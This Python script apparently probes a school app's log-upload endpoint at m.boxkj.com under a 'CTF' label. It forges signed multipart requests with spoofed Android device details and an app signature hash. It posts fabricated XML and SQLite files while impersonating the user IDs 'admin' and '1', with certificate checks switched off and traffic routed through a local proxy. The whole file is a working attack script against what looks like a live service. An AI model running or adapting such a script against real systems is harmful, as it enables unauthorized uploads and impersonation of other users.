import sys, ssl, gzip, urllib.request, sqlite3, os, uuid
sys.path.insert(0,'/Users/mac/Desktop')
from tsn_ctf_probe import build_signed, base_headers

# 构造 APP 的真实文件类型
open('/tmp/share_date.xml','w').write("<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n    <string name=\"probe\">tsn-ctf</string>\n</map>\n")
db='/tmp/TSNStudent.db'
if os.path.exists(db): os.remove(db)
c=sqlite3.connect(db); c.execute('CREATE TABLE student(id INTEGER PRIMARY KEY, name TEXT)'); c.execute("INSERT INTO student(name) VALUES ('probe')"); c.commit(); c.close()

ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
opener=urllib.request.build_opener(urllib.request.ProxyHandler({'http':'http://127.0.0.1:7897','https':'http://127.0.0.1:7897'}), urllib.request.HTTPSHandler(context=ctx))

def multi(fields, files):
    b='----TSN'+uuid.uuid4().hex
    out=bytearray()
    for k,v in fields.items():
        out += (f'--{b}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n').encode()
    for name,fn,data,ct in files:
        out += (f'--{b}\r\nContent-Disposition: form-data; name="{name}"; filename="{fn}"\r\nContent-Type: {ct}\r\n\r\n').encode()
        out += data + b'\r\n'
    out += f'--{b}--\r\n'.encode()
    return bytes(out), f'multipart/form-data; boundary={b}'

def send(user, school='sxqzy'):
    fields={'note':'测试反馈【联系方式：13800000000】','schoolCode':school,'userNum':user,'appType':'Android',
            'versionCode':'20220','versionName':'2.0.22','signatureMD5':'7fc022e67c7d2accc3c8770a46138dc3',
            'brand':'Google','model':'Pixel-7','system':'Android 13','version':'2.0.22','phone':'13800000000'}
    body,concat,sign=build_signed(fields)
    files=[('files','share_date.xml',open('/tmp/share_date.xml','rb').read(),'application/xml'),
           ('files','TSNStudent.db',open(db,'rb').read(),'application/db'),
           ('files','probe.png',open('/tmp/probe.png','rb').read(),'image/png')]
    mp,ct=multi(body,files)
    req=urllib.request.Request('https://m.boxkj.com/admin/userAppLogFile/addLogData',data=mp,headers=base_headers(),method='POST')
    req.add_header('Content-Type',ct)
    try:
        with opener.open(req,timeout=20) as r:
            data=r.read()
            if 'gzip' in (r.headers.get('Content-Encoding') or '').lower(): data=gzip.decompress(data)
            print(f'[user={user} school={school}] HTTP {r.status}: {data.decode("utf-8","replace")[:800]}')
    except urllib.error.HTTPError as e:
        data=e.read()
        if 'gzip' in (e.headers.get('Content-Encoding') or '').lower(): data=gzip.decompress(data)
        print(f'[user={user}] HTTP {e.code}: {data.decode("utf-8","replace")[:800]}')
send('admin'); send('1')
